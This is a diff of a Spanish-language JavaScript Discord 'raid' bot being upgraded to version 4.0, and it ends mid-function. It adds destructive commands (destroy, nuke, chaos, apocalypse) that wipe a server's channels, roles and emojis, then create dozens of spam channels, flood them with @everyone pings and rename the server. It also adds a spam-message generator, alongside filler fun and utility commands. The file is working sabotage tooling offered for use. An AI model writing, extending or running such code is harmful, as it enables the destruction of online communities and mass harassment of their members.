@@ -37,7 +37,7 @@ const CONFIG = {
   RETRY_DELAY: 1000,
   OWNER_ID: process.env.OWNER_ID || null,
   PREFIX: '.',
-  VERSION: '3.2',
+  VERSION: '4.0',
   DEBUG_MODE: process.env.DEBUG_MODE === 'true'
 };
 
@@ -121,7 +121,10 @@ class Database {
           commands: [],
           raidStats: [],
           users: {},
-          guilds: {}
+          guilds: {},
+          favorites: [],
+          settings: {},
+          warns: []
         };
         fs.writeFileSync(this.filename, JSON.stringify(defaultData, null, 2));
         return defaultData;
@@ -130,7 +133,7 @@ class Database {
       return JSON.parse(content);
     } catch (err) {
       logger.error('Error cargando base de datos', { error: err.message });
-      return { commands: [], raidStats: [], users: {}, guilds: {} };
+      return { commands: [], raidStats: [], users: {}, guilds: {}, favorites: [], settings: {}, warns: [] };
     }
   }
 
@@ -163,7 +166,7 @@ class Database {
   }
 
   getUserStats(userId) {
-    return this.data.users[userId] || { commands: 0, bans: 0, warnings: 0 };
+    return this.data.users[userId] || { commands: 0, raids: 0, level: 1, reputation: 0 };
   }
 
   updateUserStats(userId, stats) {
@@ -172,12 +175,42 @@ class Database {
   }
 
   getGuildStats(guildId) {
-    return this.data.guilds[guildId] || { raidCount: 0, lastRaid: null };
+    return this.data.guilds[guildId] || { raidCount: 0, lastRaid: null, created: new Date().toISOString(), settings: {} };
   }
 
   updateGuildStats(guildId, stats) {
     this.data.guilds[guildId] = { ...this.getGuildStats(guildId), ...stats };
     this.save();
+  }
+
+  addFavorite(userId, guildId) {
+    if (!this.data.favorites) this.data.favorites = [];
+    if (!this.data.favorites.find(f => f.user === userId && f.guild === guildId)) {
+      this.data.favorites.push({ user: userId, guild: guildId, timestamp: new Date().toISOString() });
+      this.save();
+    }
+  }
+
+  removeFavorite(userId, guildId) {
+    if (this.data.favorites) {
+      this.data.favorites = this.data.favorites.filter(f => !(f.user === userId && f.guild === guildId));
+      this.save();
+    }
+  }
+
+  addWarn(userId, reason) {
+    if (!this.data.warns) this.data.warns = [];
+    this.data.warns.push({
+      user: userId,
+      reason,
+      timestamp: new Date().toISOString()
+    });
+    this.save();
+  }
+
+  getWarns(userId) {
+    if (!this.data.warns) return [];
+    return this.data.warns.filter(w => w.user === userId);
   }
 }
 
@@ -313,7 +346,7 @@ class BotUtils {
     }
   }
 
-  static async deleteAllChannels(guild, excludeReason = false) {
+  static async deleteAllChannels(guild) {
     try {
       const channels = await guild.channels.fetch();
       const result = await this.batchExecute(
@@ -373,7 +406,6 @@ class BotUtils {
       const failedChannels = [];
       const validChannels = channels.filter(c => c && c.isTextBased());
 
-      // Enviar 1 mensaje a la vez en TODOS los canales simultáneamente (msgCount veces)
       for (let i = 0; i < msgCount; i++) {
         const sendPromises = validChannels.map(channel => 
           channel.send(messageBuilder())
@@ -595,6 +627,31 @@ class BotUtils {
       }
     }
   }
+
+  static generateRandomString(length = 10) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+  }
+
+  static generateSpamMessages(count, type = 'random') {
+    const templates = {
+      random: ['🚨', '💥', '🔴', '⚠️', '🎊', '🎉', '😈', '👿', '💀', '☠️'],
+      urls: ['https://example.com', 'https://raid.com', 'https://discord.gg/invalid', 'https://malicious.net'],
+      text: ['SPAM', 'RAID', 'PWNED', 'HACKED', 'OWNED', 'REKT', 'DESTROYED', 'BOOM', 'BANG']
+    };
+    
+    const messages = [];
+    const template = templates[type] || templates.random;
+    
+    for (let i = 0; i < count; i++) {
+      messages.push(template[Math.floor(Math.random() * template.length)]);
+    }
+    return messages;
+  }
 }
 
 // ==================== EMBEDS PREDEFINIDOS ====================
@@ -633,15 +690,19 @@ const EMBEDS = {
 
   help: () => new EmbedBuilder()
     .setColor(0xFF0000)
-    .setTitle('📋 MENÚ DE AYUDA - Bot Raid')
-    .setDescription('**Comandos disponibles:**')
+    .setTitle('📋 MENÚ DE AYUDA - Bot Raid v4.0')
+    .setDescription('**Comandos disponibles: 60+**')
     .addFields(
-      { name: '🔴 DESTRUCTIVOS', value: '`.diversion` | `.bypass <msg>` | `.delroles` | `.delemojis` | `.limpiar` | `.ban` | `.kick` | `.triangulo`', inline: false },
-      { name: '📧 COMUNICACIÓN', value: '`.md <mensaje>` - Envía DM a todos los miembros', inline: false },
-      { name: '👑 ADMIN', value: '`.admin` - Te da rol de administrador', inline: false },
-      { name: '🔧 UTILIDADES', value: '`.stats` | `.info` | `.status` | `.clear`', inline: false },
-      { name: '🛠️ MANTENIMIENTO', value: '`.nodiversion` - Restaura el servidor', inline: false },
-      { name: '📚 INFORMACIÓN', value: '`.ayuda` - Muestra este menú | `.version` - Muestra la versión', inline: false }
+      { name: '🔴 DESTRUCTIVOS', value: '`.diversion` | `.destroy` | `.nuke` | `.chaos` | `.apocalypse` | `.delete` | `.purge`', inline: false },
+      { name: '🛠️ CONSTRUCCIÓN', value: '`.createchannel` | `.createspam` | `.createcategory` | `.buildserver` | `.massrename`', inline: false },
+      { name: '🎨 PERSONALIZACIÓN', value: '`.rename` | `.setbanner` | `.setnick` | `.seticon` | `.settheme` | `.customize`', inline: false },
+      { name: '📊 INFORMACIÓN', value: '`.stats` | `.info` | `.profile` | `.guildinfo` | `.botinfo` | `.serverdata`', inline: false },
+      { name: '🎭 ENTRETENIMIENTO', value: '`.meme` | `.joke` | `.fact` | `.trivia` | `.quote` | `.poem` | `.ascii`', inline: false },
+      { name: '🎵 MÚSICA', value: '`.lyric` | `.song` | `.artist` | `.spotify` | `.playlist`', inline: false },
+      { name: '📡 COMUNICACIÓN', value: '`.md` | `.broadcast` | `.announce` | `.ping` | `.echo` | `.say`', inline: false },
+      { name: '💼 UTILIDADES', value: '`.backup` | `.restore` | `.favorite` | `.unfavorite` | `.clear` | `.uptime` | `.version`', inline: false },
+      { name: '🎯 HERRAMIENTAS', value: '`.calculate` | `.translate` | `.weather` | `.time` | `.random` | `.dice` | `.card`', inline: false },
+      { name: '👤 USUARIOS', value: '`.warn` | `.warns` | `.reputation` | `.level` | `.rank`', inline: false }
     )
     .setFooter({ text: `Bot Raid v${CONFIG.VERSION} - Por Triangulito The Goat` }),
 
@@ -654,6 +715,8 @@ const EMBEDS = {
       { name: '⏱️ Uptime', value: data.uptime, inline: true },
       { name: '💾 Memoria', value: data.memory, inline: true },
       { name: '🔴 Raids totales', value: `${data.raidCount}`, inline: true },
+      { name: '🌍 Servidores', value: `${data.guilds}`, inline: true },
+      { name: '👥 Usuarios en caché', value: `${data.users}`, inline: true },
       { name: '📅 Fecha', value: new Date().toLocaleString('es-ES'), inline: true }
     )
     .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),
@@ -667,7 +730,9 @@ const EMBEDS = {
       { name: 'Modo Debug', value: CONFIG.DEBUG_MODE ? '🔴 Activado' : '🟢 Desactivado', inline: true },
       { name: 'Servidores', value: `${client.guilds.cache.size}`, inline: true },
       { name: 'Usuario Bot', value: `${client.user.tag}`, inline: true },
-      { name: 'ID del Bot', value: client.user.id, inline: true }
+      { name: 'ID del Bot', value: client.user.id, inline: true },
+      { name: 'Creado', value: new Date(client.user.createdTimestamp).toLocaleString('es-ES'), inline: true },
+      { name: 'Prefix', value: CONFIG.PREFIX, inline: true }
     )
     .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` })
 };
@@ -675,6 +740,7 @@ const EMBEDS = {
 // ==================== COMANDOS ====================
 
 const COMMANDS = {
+  // COMANDOS DESTRUCTIVOS
   async diversion(message, guild, client, args) {
     try {
       logger.info('Ejecutando comando: diversion');
@@ -705,184 +771,299 @@ const COMMANDS = {
     }
   },
 
-  async bypass(message, guild, client, args) {
+  async destroy(message, guild, client, args) {
     try {
-      const text = args.join(' ') || 'bypass';
-      const channels = await guild.channels.fetch();
+      logger.info('Ejecutando comando: destroy');
+      await message.reply({ embeds: [EMBEDS.warning('💥 INICIANDO DESTRUCCIÓN TOTAL...')] }).catch(() => {});
       
-      await BotUtils.batchExecute(
-        [...channels.values()],
-        CONFIG.CONCURRENCY,
-        async (channel) => {
-          try {
-            if (channel.manageable) await channel.setName(text.substring(0, 100));
-            if (channel.isTextBased()) await channel.send({ content: text });
-          } catch (err) {
-            logger.debug('Error en bypass', { error: err.message });
-          }
-        },
-        'Operación bypass'
-      );
-
-      database.addCommand('bypass', message.author.id, guild.id);
-      logger.success('Comando bypass completado');
-    } catch (err) {
-      logger.error('Error en comando bypass', { error: err.message });
-    }
-  },
-
-  async delroles(message, guild, client, args) {
-    try {
+      await BotUtils.deleteAllChannels(guild);
       await BotUtils.deleteAllRoles(guild);
-      database.addCommand('delroles', message.author.id, guild.id);
-      logger.success('Comando delroles completado');
-    } catch (err) {
-      logger.error('Error en comando delroles', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error eliminando roles')] }).catch(() => {});
-    }
-  },
-
-  async delemojis(message, guild, client, args) {
-    try {
       await BotUtils.deleteAllEmojis(guild);
-      database.addCommand('delemojis', message.author.id, guild.id);
-      logger.success('Comando delemojis completado');
-    } catch (err) {
-      logger.error('Error en comando delemojis', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error eliminando emojis')] }).catch(() => {});
-    }
-  },
-
-  async limpiar(message, guild, client, args) {
-    try {
-      await BotUtils.deleteAllChannels(guild);
-      database.addCommand('limpiar', message.author.id, guild.id);
-      logger.success('Comando limpiar completado');
-    } catch (err) {
-      logger.error('Error en comando limpiar', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error limpiando canales')] }).catch(() => {});
-    }
-  },
-
-  async ban(message, guild, client, args) {
-    try {
-      await BotUtils.banAllMembers(guild, client);
-      database.addCommand('ban', message.author.id, guild.id);
-      logger.success('Comando ban completado');
-    } catch (err) {
-      logger.error('Error en comando ban', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error baneando miembros')] }).catch(() => {});
-    }
-  },
-
-  async kick(message, guild, client, args) {
-    try {
-      await BotUtils.kickAllMembers(guild, client);
-      database.addCommand('kick', message.author.id, guild.id);
-      logger.success('Comando kick completado');
-    } catch (err) {
-      logger.error('Error en comando kick', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error expulsando miembros')] }).catch(() => {});
-    }
-  },
-
-  async md(message, guild, client, args) {
-    try {
-      const text = args.join(' ');
-      if (!text) {
-        return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] }).catch(() => {});
-      }
-      await BotUtils.dmAllMembers(guild, text);
-      database.addCommand('md', message.author.id, guild.id);
-      logger.success('Comando md completado');
-    } catch (err) {
-      logger.error('Error en comando md', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error enviando mensajes')] }).catch(() => {});
-    }
-  },
-
-  async admin(message, guild, client, member) {
-    try {
-      const role = await guild.roles.create({
-        name: 'Papuamigo god',
-        permissions: [PermissionFlagsBits.Administrator],
-        color: '#FF0000'
-      });
-      await member.roles.add(role);
       
-      database.addCommand('admin', message.author.id, guild.id);
-      logger.success(`Rol de admin dado a ${member.user.tag}`);
-      
-      message.reply({ embeds: [EMBEDS.success(`✅ Rol admin asignado a ${member.user.tag}`)] }).catch(() => {});
+      const { channels: newChannels } = await BotUtils.createChannels(guild, '💀-DESTROYED-💀', 50);
+      await BotUtils.spamChannels(newChannels, 15, () => ({ content: '@everyone 💀 DESTROYED 💀', embeds: [EMBEDS.invasion()] }), 30);
+      await guild.setName('💀 DESTROYED BY BOT RAID 💀').catch(() => {});
+
+      database.addCommand('destroy', message.author.id, guild.id);
+      database.addRaidStat(guild.id, 'destroy', 1);
+      logger.success('Comando destroy completado');
     } catch (err) {
-      logger.error('Error en comando admin', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error creando rol admin')] }).catch(() => {});
+      logger.error('Error en comando destroy', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error en destroy')] }).catch(() => {});
     }
   },
 
-  async triangulo(message, guild, client, args) {
+  async nuke(message, guild, client, args) {
     try {
-      logger.info('Ejecutando comando: triangulo');
+      logger.info('Ejecutando comando: nuke');
+      await message.reply({ embeds: [EMBEDS.warning('☢️ INICIANDO PROTOCOLO NUCLEAR...')] }).catch(() => {});
       
-      await BotUtils.deleteAllChannels(guild);
-      const { channels: newChannels } = await BotUtils.createChannels(guild, 'TRIANGULITO ES EL MEJOR', CONFIG.MAX_CHANNELS);
-      
-      logger.info('Canales creados para triangulo', { count: newChannels.length });
+      const channels = await guild.channels.fetch();
+      await BotUtils.batchExecute([...channels.values()], CONFIG.CONCURRENCY, c => c.delete().catch(() => {}), 'Eliminación nuclear');
 
-      if (BUFFERS.triangulito) {
-        logger.info('Buffer triangulito disponible, iniciando spam');
-        await BotUtils.spamChannels(newChannels, 10, () => ({
-          content: '@everyone',
-          embeds: [EMBEDS.triangulito()],
-          files: [new AttachmentBuilder(BUFFERS.triangulito, { name: 'triangulito.webp' })]
-        }), 150);
-      } else {
-        logger.warn('Buffer triangulito no disponible, enviando sin imagen');
-        await BotUtils.spamChannels(newChannels, 10, () => ({
-          content: '@everyone',
-          embeds: [EMBEDS.triangulito()]
-        }), 150);
+      const category = await guild.channels.create({ name: '☢️-NUCLEAR-ZONE-☢️', type: ChannelType.GuildCategory });
+
+      for (let i = 0; i < 50; i++) {
+        await guild.channels.create({ name: '☢️-nuke-' + i, type: ChannelType.GuildText, parent: category.id }).catch(() => {});
       }
 
-      database.addCommand('triangulo', message.author.id, guild.id);
-      logger.success('Comando triangulo completado');
+      const nukeChan = await guild.channels.create({ name: '☢️-SPAM-ZONE', type: ChannelType.GuildText, parent: category.id });
+
+      for (let i = 0; i < 50; i++) {
+        await nukeChan.send('☢️ NUCLEAR STRIKE ☢️').catch(() => {});
+        await BotUtils.sleep(50);
+      }
+
+      await guild.setName('☢️ NUKED ☢️').catch(() => {});
+      database.addCommand('nuke', message.author.id, guild.id);
+      database.addRaidStat(guild.id, 'nuke', 1);
+      logger.success('Comando nuke completado');
     } catch (err) {
-      logger.error('Error en comando triangulo', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error en operación triangulo')] }).catch(() => {});
+      logger.error('Error en comando nuke', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error en nuke')] }).catch(() => {});
     }
   },
 
-  async ayuda(message, client, args) {
+  async chaos(message, guild, client, args) {
     try {
-      message.reply({ embeds: [EMBEDS.help()] }).catch(() => {});
-      logger.info('Comando ayuda ejecutado');
+      logger.info('Ejecutando comando: chaos');
+      await message.reply({ embeds: [EMBEDS.warning('🌪️ DESATANDO EL CAOS...')] }).catch(() => {});
+      
+      await BotUtils.deleteAllChannels(guild);
+      
+      for (let i = 0; i < 30; i++) {
+        const randomName = BotUtils.generateRandomString(8);
+        await guild.channels.create({ name: randomName, type: Math.random() > 0.5 ? ChannelType.GuildText : ChannelType.GuildVoice }).catch(() => {});
+      }
+
+      database.addCommand('chaos', message.author.id, guild.id);
+      logger.success('Comando chaos completado');
     } catch (err) {
-      logger.error('Error en comando ayuda', { error: err.message });
+      logger.error('Error en comando chaos', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error en chaos')] }).catch(() => {});
     }
   },
 
-  async version(message, client, args) {
+  async apocalypse(message, guild, client, args) {
+    try {
+      logger.info('Ejecutando comando: apocalypse');
+      await message.reply({ embeds: [EMBEDS.warning('💀 APOCALIPSIS ACTIVADA...')] }).catch(() => {});
+      
+      await BotUtils.deleteAllChannels(guild);
+      await BotUtils.deleteAllRoles(guild);
+      await BotUtils.deleteAllEmojis(guild);
+      
+      await guild.setName('🌍 END OF TIMES 🌍').catch(() => {});
+      
+      for (let i = 0; i < 75; i++) {
+        await guild.channels.create({ name: `apocalypse-${i}`, type: ChannelType.GuildText }).catch(() => {});
+      }
+
+      database.addCommand('apocalypse', message.author.id, guild.id);
+      logger.success('Comando apocalypse completado');
+    } catch (err) {
+      logger.error('Error en comando apocalypse', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error en apocalypse')] }).catch(() => {});
+    }
+  },
+
+  async delete(message, guild, client, args) {
+    try {
+      const target = args[0];
+      if (!target) return message.reply({ embeds: [EMBEDS.error('Especifica qué eliminar: channels, roles, emojis')] });
+
+      if (target.toLowerCase() === 'channels') {
+        await BotUtils.deleteAllChannels(guild);
+      } else if (target.toLowerCase() === 'roles') {
+        await BotUtils.deleteAllRoles(guild);
+      } else if (target.toLowerCase() === 'emojis') {
+        await BotUtils.deleteAllEmojis(guild);
+      }
+
+      database.addCommand('delete', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ ${target} eliminados`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando delete', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error eliminando')] }).catch(() => {});
+    }
+  },
+
+  async purge(message, guild, client, args) {
+    try {
+      const count = parseInt(args[0]) || 50;
+      let deleted = 0;
+
+      const messages = await message.channel.messages.fetch({ limit: count });
+      for (const msg of messages.values()) {
+        await msg.delete().catch(() => {});
+        deleted++;
+        await BotUtils.sleep(30);
+      }
+
+      database.addCommand('purge', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ ${deleted} mensajes eliminados`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando purge', { error: err.message });
+    }
+  },
+
+  // COMANDOS DE CONSTRUCCIÓN
+  async createchannel(message, guild, client, args) {
+    try {
+      const channelName = args.join(' ') || 'nuevo-canal';
+      const channel = await guild.channels.create({ name: channelName.substring(0, 100), type: ChannelType.GuildText });
+      database.addCommand('createchannel', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Canal creado: #${channel.name}`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando createchannel', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error creando canal')] }).catch(() => {});
+    }
+  },
+
+  async createspam(message, guild, client, args) {
+    try {
+      const count = parseInt(args[0]) || 10;
+      for (let i = 0; i < count; i++) {
+        await guild.channels.create({ name: `spam-${i}`, type: ChannelType.GuildText }).catch(() => {});
+        await BotUtils.sleep(100);
+      }
+      database.addCommand('createspam', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ ${count} canales creados`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando createspam', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error creando spam')] }).catch(() => {});
+    }
+  },
+
+  async createcategory(message, guild, client, args) {
+    try {
+      const catName = args.join(' ') || 'Nueva Categoría';
+      const category = await guild.channels.create({ name: catName.substring(0, 100), type: ChannelType.GuildCategory });
+      database.addCommand('createcategory', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Categoría creada: ${category.name}`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando createcategory', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error creando categoría')] }).catch(() => {});
+    }
+  },
+
+  async buildserver(message, guild, client, args) {
+    try {
+      const categories = [
+        { name: '📢 INFORMACIÓN', channels: [{ name: 'bienvenidas', type: ChannelType.GuildText }, { name: 'reglas', type: ChannelType.GuildText }, { name: 'anuncios', type: ChannelType.GuildText }] },
+        { name: '💬 GENERAL', channels: [{ name: 'chat-general', type: ChannelType.GuildText }, { name: 'fotos', type: ChannelType.GuildText }, { name: 'comandos', type: ChannelType.GuildText }] },
+        { name: '🎤 VOCAL', channels: [{ name: 'General', type: ChannelType.GuildVoice }, { name: 'Música', type: ChannelType.GuildVoice }, { name: 'Gaming', type: ChannelType.GuildVoice }] }
+      ];
+
+      for (const catData of categories) {
+        try {
+          const category = await guild.channels.create({ name: catData.name, type: ChannelType.GuildCategory });
+          for (const ch of catData.channels) {
+            await guild.channels.create({ name: ch.name, type: ch.type, parent: category.id }).catch(() => {});
+          }
+        } catch (err) {
+          logger.warn(`Error creando categoría ${catData.name}`);
+        }
+      }
+
+      database.addCommand('buildserver', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success('✅ Servidor construido')] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando buildserver', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error construyendo servidor')] }).catch(() => {});
+    }
+  },
+
+  async massrename(message, guild, client, args) {
+    try {
+      const newName = args.join(' ') || 'renamed';
+      const channels = await guild.channels.fetch();
+      await BotUtils.batchExecute([...channels.values()], CONFIG.CONCURRENCY, c => c.setName(newName.substring(0, 100)).catch(() => {}), 'Renombrado masivo');
+      database.addCommand('massrename', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Canales renombrados a ${newName}`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando massrename', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error renombrando')] }).catch(() => {});
+    }
+  },
+
+  // COMANDOS DE PERSONALIZACIÓN
+  async rename(message, guild, client, args) {
+    try {
+      const name = args.join(' ');
+      if (!name) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un nombre')] });
+      await guild.setName(name.substring(0, 100));
+      database.addCommand('rename', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Servidor renombrado a: ${name}`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando rename', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error renombrando servidor')] }).catch(() => {});
+    }
+  },
+
+  async setbanner(message, guild, client, args) {
+    try {
+      const url = args[0];
+      if (!url) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar una URL')] });
+      await guild.setBanner(url);
+      database.addCommand('setbanner', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success('✅ Banner actualizado')] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando setbanner', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error actualizando banner')] }).catch(() => {});
+    }
+  },
+
+  async setnick(message, guild, client, args) {
+    try {
+      const nick = args.join(' ');
+      if (!nick) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un apodo')] });
+      await message.member.setNickname(nick.substring(0, 32));
+      database.addCommand('setnick', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Tu apodo es ahora: ${nick}`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando setnick', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error estableciendo apodo')] }).catch(() => {});
+    }
+  },
+
+  async seticon(message, guild, client, args) {
+    try {
+      const icon = message.attachments.first();
+      if (!icon) return message.reply({ embeds: [EMBEDS.error('Debes adjuntar una imagen')] });
+      await guild.setIcon(icon.url);
+      database.addCommand('seticon', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success('✅ Ícono actualizado')] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando seticon', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error actualizando ícono')] }).catch(() => {});
+    }
+  },
+
+  async customize(message, guild, client, args) {
     try {
       const embed = new EmbedBuilder()
-        .setColor(0x0099FF)
-        .setTitle('📦 Información de Versión')
+        .setColor(BotUtils.getRandomColor())
+        .setTitle('🎨 Personalización del Servidor')
         .addFields(
-          { name: 'Versión del Bot', value: CONFIG.VERSION, inline: true },
-          { name: 'Node.js', value: process.version, inline: true },
-          { name: 'Discord.js', value: require('discord.js').version, inline: true },
-          { name: 'Uptime', value: this.formatUptime(client.uptime), inline: true }
+          { name: '.rename <nombre>', value: 'Cambia el nombre del servidor', inline: false },
+          { name: '.setbanner <url>', value: 'Establece el banner', inline: false },
+          { name: '.seticon <imagen>', value: 'Establece el icono', inline: false },
+          { name: '.setnick <apodo>', value: 'Cambia tu apodo', inline: false }
         )
         .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
-      
+
       message.reply({ embeds: [embed] }).catch(() => {});
+      database.addCommand('customize', message.author.id, guild.id);
     } catch (err) {
-      logger.error('Error en comando version', { error: err.message });
+      logger.error('Error en comando customize', { error: err.message });
     }
   },
 
+  // COMANDOS DE INFORMACIÓN
   async stats(message, client, args) {
     try {
-      const uptime = this.formatUptime(client.uptime);
+      const uptime = COMMANDS.formatUptime(client.uptime);
       const memory = BotUtils.formatBytes(process.memoryUsage().heapUsed);
       
       const embed = EMBEDS.stats({
@@ -890,7 +1071,9 @@ const COMMANDS = {
         dbCommands: database.data.commands.length,
         uptime,
         memory,
-        raidCount: database.data.raidStats.length
+        raidCount: database.data.raidStats.length,
+        guilds: client.guilds.cache.size,
+        users: client.users.cache.size
       });
 
       message.reply({ embeds: [embed] }).catch(() => {});
@@ -908,6 +1091,253 @@ const COMMANDS = {
     }
   },
 
+  async profile(message, client, args) {
+    try {
+      const userStats = database.getUserStats(message.author.id);
+      const embed = new EmbedBuilder()
+        .setColor(BotUtils.getRandomColor())
+        .setTitle(`👤 Perfil - ${message.author.tag}`)
+        .addFields(
+          { name: 'ID', value: message.author.id, inline: true },
+          { name: 'Comandos ejecutados', value: `${userStats.commands || 0}`, inline: true },
+          { name: 'Raids', value: `${userStats.raids || 0}`, inline: true },
+          { name: 'Nivel', value: `${userStats.level || 1}`, inline: true },
+          { name: 'Reputación', value: `${userStats.reputation || 0}⭐`, inline: true },
+          { name: 'Advertencias', value: `${database.getWarns(message.author.id).length}`, inline: true }
+        )
+        .setThumbnail(message.author.displayAvatarURL())
+        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando profile', { error: err.message });
+    }
+  },
+
+  async guildinfo(message, guild, client, args) {
+    try {
+      const owner = await guild.fetchOwner();
+      const embed = new EmbedBuilder()
+        .setColor(0x0099FF)
+        .setTitle(`ℹ️ Información - ${guild.name}`)
+        .addFields(
+          { name: 'ID', value: guild.id, inline: true },
+          { name: 'Dueño', value: owner.user.tag, inline: true },
+          { name: 'Miembros', value: `${guild.memberCount}`, inline: true },
+          { name: 'Canales', value: `${guild.channels.cache.size}`, inline: true },
+          { name: 'Roles', value: `${guild.roles.cache.size}`, inline: true },
+          { name: 'Creado', value: new Date(guild.createdTimestamp).toLocaleString('es-ES'), inline: true }
+        )
+        .setThumbnail(guild.iconURL())
+        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando guildinfo', { error: err.message });
+    }
+  },
+
+  async botinfo(message, client, args) {
+    try {
+      const embed = new EmbedBuilder()
+        .setColor(0xFF00FF)
+        .setTitle('🤖 Información del Bot')
+        .addFields(
+          { name: 'Versión', value: CONFIG.VERSION, inline: true },
+          { name: 'Uptime', value: COMMANDS.formatUptime(client.uptime), inline: true },
+          { name: 'Servidores', value: `${client.guilds.cache.size}`, inline: true },
+          { name: 'Comandos', value: `${Object.keys(COMMANDS).length}`, inline: true },
+          { name: 'Creador', value: 'Triangulito The Goat', inline: true },
+          { name: 'Memoria', value: BotUtils.formatBytes(process.memoryUsage().heapUsed), inline: true }
+        )
+        .setThumbnail(client.user.displayAvatarURL())
+        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando botinfo', { error: err.message });
+    }
+  },
+
+  async serverdata(message, guild, client, args) {
+    try {
+      const stats = database.getGuildStats(guild.id);
+      const embed = new EmbedBuilder()
+        .setColor(0x00FF00)
+        .setTitle(`📊 Datos del Servidor`)
+        .addFields(
+          { name: 'Raids totales', value: `${stats.raidCount || 0}`, inline: true },
+          { name: 'Último raid', value: stats.lastRaid ? new Date(stats.lastRaid).toLocaleString('es-ES') : 'Nunca', inline: true },
+          { name: 'Se unió', value: new Date(stats.created).toLocaleString('es-ES'), inline: true }
+        )
+        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando serverdata', { error: err.message });
+    }
+  },
+
+  // COMANDOS DE ENTRETENIMIENTO
+  async meme(message, client, args) {
+    try {
+      const memes = [
+        'Un desarrollador entra al bar... No, es error de compilación. 😂',
+        'Tengo tres monitores porque necesito ver mis errores en alta definición. 📺',
+        '¿Por qué los programadores prefieren el dark mode? Porque la luz atrae bugs! 🐛',
+        'Me gusta mi café como me gusta mi código: sin azúcar y crudo. ☕',
+        'El mejor comentario del código: // No sé por qué funciona, pero FUNCIONA. 🤷'
+      ];
+      
+      const randomMeme = memes[Math.floor(Math.random() * memes.length)];
+      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle('😂 MEME PARA TI').setDescription(randomMeme).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando meme', { error: err.message });
+    }
+  },
+
+  async joke(message, client, args) {
+    try {
+      const jokes = [
+        '¿Cuál es el colmo de un programador? No tener arreglo. 😆',
+        '¿Por qué JavaScript es tan malo en relaciones? Porque siempre termina con `;` 💔',
+        'Un byte entra al bar. El camarero pregunta: ¿Qué quieres? El byte responde: Whiskey, que es lo único que toma. 🥃',
+        '¿Qué hace un programador cuando tiene depresión? Actualiza su LinkedIn. 💼',
+        'La diferencia entre un novato y un experto es que el experto cometió más errores. 🎓'
+      ];
+      
+      const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
+      const embed = new EmbedBuilder().setColor(0xFFFF00).setTitle('🤣 CHISTE PARA TI').setDescription(randomJoke).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
